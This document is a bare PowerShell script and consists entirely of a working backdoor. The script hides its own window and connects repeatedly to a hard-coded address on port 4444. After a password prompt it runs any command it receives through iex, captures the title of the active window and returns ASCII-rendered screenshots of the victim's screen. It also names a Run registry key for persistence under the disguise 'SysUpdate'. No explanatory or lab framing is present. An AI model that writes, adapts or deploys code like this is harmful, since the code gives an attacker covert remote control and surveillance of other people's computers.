$ip = '172.16.176.40'; $port = 4444; $pass = "biskviti" 
$reg = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; $name = "SysUpdate"
$tmp = "$env:TEMP\sysupd.ps1"

$api = Add-Type -Name Win32 -MemberDefinition @'
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
'@ -PassThru
$api::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

function Die {
    Remove-ItemProperty -Path $reg -Name $name -Force -ErrorAction SilentlyContinue
    Stop-Process -Id $PID -Force
}

while($true) {
    try {
        $c = New-Object System.Net.Sockets.TCPClient($ip, $port); $s = $c.GetStream(); $e = New-Object System.Text.UTF8Encoding
        
        $s.Write(($e.GetBytes("AUTH REQUIRED: ")), 0, 15)
        [byte[]]$authB = New-Object byte[] 64; $len = $s.Read($authB, 0, $authB.Length)
        $attempt = $e.GetString($authB, 0, $len).Trim()

        if ($attempt -ne $pass) {
            $s.Write(($e.GetBytes("WRONG PASSWORD. DESTROYING SESSION...`n")), 0, 37)
            $c.Close(); Die
        }

        $s.Write(($e.GetBytes("ACCESS GRANTED. Commands: screen, screenshot, kill`nPS $PWD> ")), 0, 58)

        [byte[]]$b = New-Object byte[] 65535
        while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
            $in = $e.GetString($b, 0, $i).Trim(); $out = ""

            if ($in -eq 'kill') { Die }
            
            elseif ($in -eq 'screen') {
                $handle = $api::GetForegroundWindow()
                $sb = New-Object System.Text.StringBuilder 256
                $api::GetWindowText($handle, $sb, $sb.Capacity)
                $out = "[!] Active Window: " + $sb.ToString() + "`n"
            }

            elseif ($in -eq 'screenshot') {
                try {
                    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                    $sc = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $w = 100; $h = [int]($w * ($sc.Height / $sc.Width) * 0.5)
                    $bmp = New-Object System.Drawing.Bitmap $w, $h
                    $g = [System.Drawing.Graphics]::FromImage($bmp)
                    $full = New-Object System.Drawing.Bitmap $sc.Width, $sc.Height
                    $fg = [System.Drawing.Graphics]::FromImage($full)
                    $fg.CopyFromScreen($sc.X, $sc.Y, 0, 0, $full.Size)
                    $g.DrawImage($full, 0, 0, $w, $h)
                    
                    $ramp = "#","W","M","B","@","q","o","*","+","-",":","."," "
                    $ascii = "`n--- VIEW ---`n"
                    for ($y=0; $y -lt $h; $y++) {
                        for ($x=0; $x -lt $w; $x++) {
                            $px = $bmp.GetPixel($x, $y)
                            $bri = ($px.R + $px.G + $px.B) / 3
                            $ascii += $ramp[[int][Math]::Floor(($bri/255)*($ramp.Length-1))]
                        }
                        $ascii += "`n"
                    }
                    $out = $ascii + "--- END ---`n"; $fg.Dispose(); $full.Dispose(); $g.Dispose(); $bmp.Dispose()
                } catch { $out = "[!] Error: $($_.Exception.Message)`n" }
            }
            else {
                $out = try { if ($in) { iex $in 2>&1 | Out-String } } catch { $_.Exception.Message }
            }
            $resp = $e.GetBytes($out + "PS $PWD> "); $s.Write($resp, 0, $resp.Length); $s.Flush()
        }
    } catch { Start-Sleep 5 }
}
